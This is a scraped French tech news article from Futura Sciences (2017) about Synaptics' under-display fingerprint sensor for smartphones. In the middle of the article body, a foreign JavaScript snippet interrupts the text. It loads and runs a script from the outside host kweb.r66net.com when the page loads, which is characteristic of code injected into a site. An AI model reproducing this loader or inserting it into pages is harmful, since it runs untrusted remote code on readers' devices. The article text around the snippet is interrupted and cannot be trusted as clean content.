{"title": "Smartphones : un capteur d'empreintes digitales sous l'écran", "newspaper": "Futura Sciences", "author": "Marc Zaffagni", "date_publi": "13/12/2017", "content": "Synaptics, le principal fabricant d'interfaces tactiles pour les PC portables et les smartphones, a annoncé la mise en production d'un capteur d'empreintes digitales pouvant être intégré sous l'écran d'un téléphone. Cela supprime la nécessité d'un bouton physique dédié et ouvre de nouvelles possibilités de design et d'ergonomie. L'intégration d'un  capteur  d' empreintes digitales  invisible, directement sous la surface de l' écran tactile , s'annonce comme l'une des principales nouveautés techniques de 2018 pour les  smartphones  haut de gamme. Synaptics, spécialisé dans les interfaces tactiles, d'affichage et biométriques, vient d'annoncer qu'il entamait la production en  masse  de son capteur biométrique  ClearID FS9500  avec cinq fabricants de  smartphones  de premier plan. Apparus sur certains appareils ces dernières années, les lecteurs d'empreintes digitales servent à déverrouiller l'accès au terminal ou encore à valider des achats en ligne  via  des  applications  de paiement compatibles. On les trouve soit en façade du mobile, intégrés au bouton d'accueil, soit à l'arrière, près du capteur photo.   ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Synaptics ouvre la voie vers un nouveau design des smartphones Or, la tendance actuelle est aux  smartphones  avec des écrans quasiment dépourvus de bordures. Samsung a initié le  mouvement  en 2015 avec le Galaxy Note 4  Edge  aux bords recourbés, imité de différentes façons par les autres constructeurs. Et l'on s'achemine désormais vers des mobiles dont les écrans occuperont la totalité de la surface, créant un effet d'immersion totale.  C'est en cela que le capteur de Synaptics marque une étape importante, car il va permettre de supprimer un bouton  physique  parfois très mal situé, comme c'est le cas sur le Galaxy S8 par exemple. On ignore qui sont les cinq fabricants auxquels Synaptics fait allusion, mais il est assez probable qu' Apple ,  Samsung , LG, Sony et Huawei en fassent tous, ou pour certains, partie. Vous avez aimé cet article ? N'hésitez pas à le partager avec vos ami(e)s et aidez-nous à faire connaître Futura :) ! La Rédaction vous remercie. Facebook Twitter Google+ Linkedin Pinterest À voir aussi :  empreintes digitales  |  empreintes digitales mathematiques  |  origines empreintes digitales  |  definition empreintes digitales  |  vrais jumeaux empreintes digitales  |  smartphones  |  capteur sous vide  |  ecran sous toiture  |  fond ecran sous mer  |  empreintes palmaires", "theme": "tech"}